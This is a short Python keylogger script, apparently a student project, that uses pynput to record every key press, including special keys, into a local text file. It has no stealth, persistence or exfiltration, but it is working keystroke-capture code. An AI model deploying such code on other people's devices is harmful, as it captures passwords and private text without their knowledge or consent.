from pynput import keyboard

# Clear the text file at the start of the program
with open("keyfile.txt", 'w') as logkey:
    logkey.write("")

def keyPressed(key):
    with open("keyfile.txt", 'a') as logkey:
        try:
            # Check if the key is alphanumeric or a symbol
            if hasattr(key, 'char') and key.char is not None:
                logkey.write(key.char)
            else:
                # Handle special keys
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.backspace: '<backspace>',
                    keyboard.Key.tab: '<tab>',
                    keyboard.Key.enter: '<enter>',
                    keyboard.Key.shift: '<shift>',
                    keyboard.Key.ctrl: '<ctrl>',
                    keyboard.Key.alt: '<alt>',
                    keyboard.Key.caps_lock: '<caps_lock>',
                    keyboard.Key.esc: '<esc>',
                    keyboard.Key.delete: '<delete>',
                    keyboard.Key.up: '<up>',
                    keyboard.Key.down: '<down>',
                    keyboard.Key.left: '<left>',
                    keyboard.Key.right: '<right>',
                }
                if key in special_keys:
                    logkey.write(special_keys[key])
                else:
                    logkey.write(f'<{key}>')  # For other special keys
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()  # Keep the script running
    # we can add a new line character after enter, full stop something
    # not only this we need to ask ma'am regarding arduino integration
    # this is running
